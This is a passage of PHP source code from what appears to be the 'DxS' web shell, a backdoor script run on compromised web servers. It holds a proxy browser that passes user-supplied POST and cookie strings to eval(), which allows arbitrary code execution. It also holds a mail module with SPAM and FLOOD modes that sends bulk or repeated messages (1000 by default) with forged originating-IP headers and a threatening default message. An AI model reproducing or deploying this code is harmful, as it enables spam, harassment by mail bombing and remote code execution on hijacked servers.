	print "\n".'<tr><td width=100pt class=linelisting>URL</td><td><input type=text name="DxProx_Url" value="'.(isset($_POST['DxProx_Url'])?$_POST['DxProx_Url']:'http://www.microsoft.com:80/index.php?get=q&get2=d').'" style="width:100%;"></td></tr>';
	print "\n".'<tr><td width=100pt colspan=2 class=linelisting><nobr>Browser <input type=text name="DxProx_Brw" value="'.(isset($_POST['DxProx_Brw'])?$_POST['DxProx_Brw']:'DxS Browser').'" style="width:40%;">'
				.' Referer <input type=text name="DxProx_Ref" value="'.(isset($_POST['DxProx_Ref'])?$_POST['DxProx_Ref']:'http://www.ref.ru/').'" style="width:40%;"></td></tr>';
	print "\n".'<tr><td width=100pt class=linelisting><nobr>POST (php eval)</td><td><input type=text name="DxProx_PST" value="'.(isset($_POST['DxProx_PST'])?$_POST['DxProx_PST']:'array(\'post_val\' => \'Yeap\')').'" style="width:100%;"></td></tr>';
	print "\n".'<tr><td width=100pt class=linelisting><nobr>COOKIES (php eval)</td><td><input type=text name="DxProx_CKI" value="'.(isset($_POST['DxProx_CKI'])?$_POST['DxProx_CKI']:'array(\'cookiename\' => \'val\')').'" style="width:100%;"></td></tr>';
	print "\n".'<tr><td colspan=2><input type=submit value="Go" class=submit style="width:100%;">';
	print "\n".'</td></tr></table></form>';

	if (!isset($_POST['DxProx_Url'])) die();

	print str_repeat("\n", 10).'<!-- DxS Proxy Browser -->'."\n\n";

	if (empty($_POST['DxProx_PST'])) $_POST['DxProx_PST']=array();
		else {if (eval('$_POST[\'DxProx_PST\']='.$_POST['DxProx_PST'].';')===FALSE) $_POST['DxProx_PST']=array();}
	if (empty($_POST['DxProx_CKI'])) $_POST['DxProx_CKI']=array();
		else {if (eval('$_POST[\'DxProx_CKI\']='.$_POST['DxProx_CKI'].';')===FALSE) $_POST['DxProx_CKI']=array();}

	$URLPARSED=parse_url($_POST['DxProx_Url']);
	$request=DxHTTPMakeHeaders('GET', (empty($URLPARSED['path'])?'/':$URLPARSED['path']).(!empty($URLPARSED['query'])?'?'.$URLPARSED['query']:''), $URLPARSED['host'], $_POST['DxProx_Brw'], $_POST['DxProx_Ref'], $_POST['DxProx_PST'], $_POST['DxProx_CKI']);
	if (!($f=@fsockopen($URLPARSED['host'], (empty($URLPARSED['port']))?80:$URLPARSED['port'], $errno, $errstr, 10)))
		die(DxError('Sock #'.$errno.' : '.$errstr));
	fputs($f, $request);

	$RET='';
	while (!feof($f)) $RET.=fgets($f, 4096 );
	fclose( $f );

	print "\n".'<table width=100% border=0><tr><td>';
	$headers_over_place=strpos($RET,"\r\n\r\n");
	if ($headers_over_place===FALSE)	print $RET;
		else
		print '<pre><font class=highlight_txt>'.substr($RET, 0, $headers_over_place).'</font></pre><br><hr><br>'.substr($RET, $headers_over_place);
	print str_repeat("\n", 10).'</td></tr></table>';
	}

########
########   MAIL
########
if ($_GET['dxmode']=='MAIL')
	{	if (!isset($_GET['dxparam']))
		{
		print '';		print "\n".'<form action="'.DxURL('kill', '').'" method=GET style="display:inline;">';
		DxGETinForm('leave', '');
		print "\n".'<input type=submit name="dxparam" value="SPAM" style="position: absolute; width: 30%; left: 10%;">'
			.'<font class=highlight_txt style="position:absolute;left:46.5%;">: MAIL mode :</font>'
			.'<input type=submit name="dxparam" value="FLOOD" style="position: absolute; width: 30%; right: 10%;">';
		print "\n".'</form>';
		die();}

	if (ini_get('sendmail_path')=='') DxWarning('php.ini "sendmail_path" is empty! ('.var_export(ini_get('sendmail_path'), true).')');
	print "\n\t".'<form action="'.DxURL('leave', '').'" method=POST>';
	print "\n".'<table width=100% cellspacing=0 width=90% align=center><col width=100pt>';
	if ($_GET['dxparam']=='FLOOD')
		{		print "\n".'<tr><td class=linelisting><b>TO: </td><td><input type=text name="DxMailer_TO" style="width:100%;" value="'.(  (empty($_POST['DxMailer_TO']))?'tristam@mail.ru':$_POST['DxMailer_TO']  ).'"></td></tr>';
		print "\n".'<tr><td class=linelisting><b>NUM FLOOD: </td><td><input type=text name="DxMailer_NUM" value="'.(  (empty($_POST['DxMailer_NUM']))?'1000':$_POST['DxMailer_NUM']  ).'" SIZE=10></td></tr>';
		}
		else		print "\n".'<tr><td class=linelisting><b>TO: </td><td><textarea name="DxMailer_TO" rows=10 style="width:100%;">'.(  (empty($_POST['DxMailer_TO']))?'tristam@mail.ru'."\n".'billy@microsoft.com':$_POST['DxMailer_TO']  ).'</textarea></td></tr>';
	print "\n".'<tr><td class=linelisting><b>FROM: </td><td><input type=text name="DxMailer_FROM" value="'.(  (empty($_POST['DxMailer_FROM']))?'DxS <admin@'.$_SERVER['HTTP_HOST']:$_POST['DxMailer_FROM']  ).'>" style="width:100%;"></td></tr>';
	print "\n".'<tr><td class=linelisting><b>SUBJ: </td><td><input type=text name="DxMailer_SUBJ" style="width:100%;" value="'.(  (empty($_POST['DxMailer_SUBJ']))?'Look here, man...':$_POST['DxMailer_SUBJ']  ).'"></td></tr>';
	print "\n".'<tr><td class=linelisting><b>MSG: </td><td><textarea name="DxMailer_MSG" rows=5 style="width:100%;">'.(  (empty($_POST['DxMailer_MSG']))?'<html><body><b>Wanna be butchered?':$_POST['DxMailer_MSG']  ).'</textarea></td></tr>';
	print "\n".'<tr><td class=linelisting colspan=2><div align=center><input type=submit Value="'.$_GET['dxparam'].'" class=submit style="width:70%;"></tr>';
	print "\n".'</td></table></form>';

	if (!isset($_POST['DxMailer_TO'])) die();

	$HEADERS='';
	$HEADERS.= 'MIME-Version: 1.0'."\r\n";
	$HEADERS.= 'Content-type: text/html;'."\r\n";
	$HEADERS.='To: %%TO%%'."\r\n";
	$HEADERS.='From: '.$_POST['DxMailer_FROM']."\r\n";
	$HEADERS.='X-Originating-IP: [%%IP%%]'."\r\n";
	$HEADERS.='X-Mailer: DxS v'.$GLOB['SHELL']['Ver'].' Mailer'."\r\n";
	$HEADERS.='Message-Id: <%%ID%%>';

	if ($_GET['dxparam']=='FLOOD')
		{		$NUM=$_POST['DxMailer_NUM'];
		$MAILS=array($_POST['DxMailer_TO']);
		}
		else
		{		$MAILS=explode("\n",str_replace("\r", '', $_POST['DxMailer_TO']));
		$NUM=1;
		}

	function DxMail($t, $s, $m, $h)   /* debugger */
	{print "\n\n\n<br><br><br>".$t."\n<br>".$s."\n<br>".$m."\n<br>".$h;}

	$RESULTS[]=array();

	for ($n=0;$n<$NUM;$n++)
	for ($m=0;$m<count($MAILS);$m++)		$RESULTS[]=(int)
		mail($MAILS[$m], $_POST['DxMailer_SUBJ'], $_POST['DxMailer_MSG'],
			str_replace(array('%%TO%%','%%IP%%', '%%ID%%'),
						array('<'.$MAILS[$m].'>'  ,  long2ip(mt_rand(0,pow(2,31)))  ,  md5($n.$m.DxRandomChars(3).time())),
						$HEADERS)
			);

	print "\n\n".'<br><br>'.array_sum($RESULTS).' mails sent ('.(		(100*array_sum($RESULTS))/($NUM*(count($MAILS)))		).'% okay)';

	}

if ($DXGLOBALSHIT) print "\n\n\n".'<!--/SHIT KILLER--></TD></TR></TABLE>';
die();
?>

